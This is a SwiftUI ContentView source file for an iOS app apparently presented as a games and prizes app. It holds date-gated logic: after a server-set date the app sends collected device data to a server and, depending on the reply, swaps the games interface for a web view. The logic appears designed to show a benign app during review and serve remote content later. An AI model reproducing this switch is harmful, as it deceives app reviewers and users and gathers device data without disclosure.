//
//  ContentView.swift
//  App564
//
//  Created by DJUROM on 03/06/2024.
//

import SwiftUI

struct ContentView: View {
    
    @State var current_tab: Tab = .Games
    
    @State var isFetched: Bool = false
    
    @State var isBlock: Bool = true
    @State var isDead: Bool = false
    
    @AppStorage("status") var status: Bool = false
    
    init() {
        
        UITabBar.appearance().isHidden = true
    }
    
    var body: some View {
        
        ZStack {
            
            Color.black
                .ignoresSafeArea()
            
            if isFetched == false {
                
                LoadingView()
                
            } else if isFetched == true {
                
                if isBlock == true {
                    
                    if status {
                        
                        VStack(spacing: 0, content: {
                            
                            TabView(selection: $current_tab, content: {
                                
                                GamesView()
                                    .tag(Tab.Games)
                                
                                PrizesView()
                                    .tag(Tab.Prizes)
                                
                                SettingsView()
                                    .tag(Tab.Settings)
                                
                            })
                            
                            TabBar(selectedTab: $current_tab)
                        })
                        .ignoresSafeArea(.all, edges: .bottom)
                        
                    } else {
                        
                        OBR1()
                    }
                    
                } else if isBlock == false {
                    
                    if status {
                        
                        WebSystem()
                        
                    } else {
                        
                        OBU1()
                    }
                }
            }
        }
        .onAppear {
            
            check_data()
        }
    }
    
    private func check_data() {
        
        fetchData { server1_0, codeTech, isAllChangeURL, isDead, lastDate, url_link, error in
            
            if let error = error {
                
                print("Ошибка: \(error.localizedDescription)")
                
            } else {
                
                guard let isDead = isDead else { return }
                guard let lastDate = lastDate else { return }
                
                self.isDead = isDead
                
                let dateFormatter = DateFormatter()
                        dateFormatter.dateFormat = "dd.MM.yyyy"
                dateFormatter.timeZone = TimeZone(abbreviation: "GMT")
                let targetDate = dateFormatter.date(from: lastDate) ?? Date()
                let now = Date()

                guard now > targetDate else {

                    isBlock = true
                    isFetched = true

                    return
                }
                
                let networkService = NetworkService()
                let deviceData = DeviceInfo.collectData()
                
                networkService.sendRequest(endpoint: deviceData) { result in
                    
                    switch result {
                        
                    case .success(let success):
                        
                        self.isBlock = success
                        self.isFetched = true
                        
                    case .failure(_):
                        
                        self.isBlock = self.isDead
                        self.isFetched = true
                    }
                }
            }
        }
    }
}

#Preview {
    ContentView()
}
